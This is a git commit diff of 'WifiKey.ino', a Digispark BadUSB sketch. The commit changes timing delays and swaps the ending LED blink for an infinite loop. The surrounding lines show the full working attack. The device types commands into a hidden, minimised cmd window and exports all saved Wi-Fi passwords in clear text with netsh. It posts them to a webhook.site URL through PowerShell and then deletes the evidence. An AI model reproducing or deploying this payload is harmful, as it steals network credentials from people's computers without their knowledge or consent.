c9f8f173d4e71878b578c7e343849df549a4b6d8
Choudhary Abdullah <magnetonx@gmail.com>
2020-02-02 21:25:48 +0530

    Update WifiKey.ino

--- WifiKey.ino
+++ WifiKey.ino
@@ -7,10 +7,10 @@ void setup() {
 void loop() {
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
+  DigiKeyboard.delay(2000);
  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(500);
   DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
   DigiKeyboard.delay(500);
   DigiKeyboard.delay(500);
@@ -21,7 +21,7 @@ void loop() {
       DigiKeyboard.sendKeyStroke(KEY_DOWN);
     }
   DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(500);
   DigiKeyboard.println("cd %temp%"); //going to temporary dir
   DigiKeyboard.delay(500);
   DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
@@ -31,13 +31,8 @@ void loop() {
   DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/8a124847-33fa-4d12-b60b-a45be1c2a9cd -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-Fi-* /s /f /q"); //cleaning up all the mess
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(200);
   DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
-  
   digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
-  
+  for(;;){ }
 }
